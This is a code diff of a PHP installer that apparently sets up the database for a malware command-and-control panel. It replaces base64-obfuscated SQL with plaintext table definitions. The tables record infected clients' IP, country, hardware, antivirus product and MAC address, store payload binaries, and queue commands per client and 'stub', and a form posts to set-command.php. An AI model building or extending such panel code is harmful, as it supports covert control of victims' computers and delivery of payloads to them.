@@ -4,10 +4,17 @@ session_start();
 session_unset();
 session_destroy();
 
+include('./database/db-config.php');
+include('./database/db-conn.php');
 
 function CreateUsers($connection)
 {
-    $SqlCreateUsers = base64_decode("Q1JFQVRFIFRBQkxFIGBVc2Vyc2AgKAoJYElkYCBJTlQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQsCglgVXNlcm5hbWVgIFZBUkNIQVIoNjApIE5PVCBOVUxMLAoJYFBhc3N3b3JkYCBWQVJDSEFSKDYwKSBOT1QgTlVMTCwKCVBSSU1BUlkgS0VZIChgSWRgKQopOw==");
+    $SqlCreateUsers = "CREATE TABLE `Users` (
+        `Id` INT NOT NULL AUTO_INCREMENT,
+        `Username` VARCHAR(60) NOT NULL,
+        `Password` VARCHAR(60) NOT NULL,
+        PRIMARY KEY (`Id`)
+    );";
     
     try
     {
@@ -25,7 +32,17 @@ function CreateUsers($connection)
 
 function CreateClients($connection)
 {
-    $SqlCreateClients = base64_decode("Q1JFQVRFIFRBQkxFIGBDbGllbnRzYCAoCglgSWRgIElOVCBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVCwKCWBJcGAgVkFSQ0hBUigyNCkgTk9UIE5VTEwsCglgQ291bnRyeWAgVkFSQ0hBUigxMikgTk9UIE5VTEwsCglgUmFtYCBWQVJDSEFSKDEyKSBOT1QgTlVMTCwKCWBMYXN0U2VlbmAgVElNRVNUQU1QIE5PVCBOVUxMIE9OIFVQREFURSBDVVJSRU5UX1RJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAoJYENQVWAgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAoJYEFudGlWaXJ1c2AgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAoJUFJJTUFSWSBLRVkgKGBJZGApCik7");
+    $SqlCreateClients = "CREATE TABLE `Clients` (
+        `Id` INT NOT NULL AUTO_INCREMENT,
+        `Ip` VARCHAR(24) NOT NULL,
+        `Country` VARCHAR(12) NOT NULL,
+        `Ram` VARCHAR(12) NOT NULL,
+        `LastSeen` TIMESTAMP NOT NULL ON UPDATE CURRENT_TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        `CPU` VARCHAR(255) NOT NULL,
+        `AntiVirus` VARCHAR(255) NOT NULL,
+        `MacAddr` VARCHAR(255) NOT NULL,
+        PRIMARY KEY (`Id`)
+    );";
     
     try
     {
@@ -43,7 +60,14 @@ function CreateClients($connection)
 
 function CreatePayloads($connection)
 {
-    $SqlCreatePayload = base64_decode("Q1JFQVRFIFRBQkxFIGBQYXlsb2Fkc2AgKAoJYElkYCBJTlQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQsCglgTmFtZWAgVkFSQ0hBUigxNikgTk9UIE5VTEwsCglgUGF5bG9hZEJ5dGVzYCBCTE9CLAoJUFJJTUFSWSBLRVkgKGBJZGApCik7");
+    $SqlCreatePayload = "CREATE TABLE `Payloads` (
+        `Id` INT NOT NULL AUTO_INCREMENT,
+        `FileName` VARCHAR(16) NOT NULL,
+        `Name` VARCHAR(16) NOT NULL,
+        `Extension` varchar(6) NOT NULL,
+        `PayloadBytes` BLOB,
+        PRIMARY KEY (`Id`)
+    );";
     
     try
     {
@@ -61,7 +85,14 @@ function CreatePayloads($connection)
 
 function CreateCommands($connection)
 {
-    $SqlCreateCommands = base64_decode("Q1JFQVRFIFRBQkxFIGBDb21tYW5kYCAoCglgSWRgIElOVCBOT1QgTlVMTCwKCWBDbGllbnRfSWRgIElOVCBOT1QgTlVMTCwKCWBDb21tYW5kYCBWQVJDSEFSKDE2KSBOT1QgTlVMTCwKCVBSSU1BUlkgS0VZIChgSWRgKQopOw==");
+    $SqlCreateCommands = "CREATE TABLE `Command` (
+        `Id` INT NOT NULL,
+        `StubId` INT,
+        `Client_Id` INT NOT NULL,
+        `Command` VARCHAR(16) NOT NULL,
+        PRIMARY KEY (`Id`)
+    );";
+    
     try
     {
         $connection->exec($SqlCreateCommands);
@@ -111,7 +142,7 @@ function InsertUser($connection)
         <div class="container">
             <form action="set-command.php" method="post">
                 <section class="section">
-                    <?php include './database/db-conn.php'?>
+                    
                     <div class="columns is-centered">
                         <div class="column is-6">
                             <div class="notification is-primary">
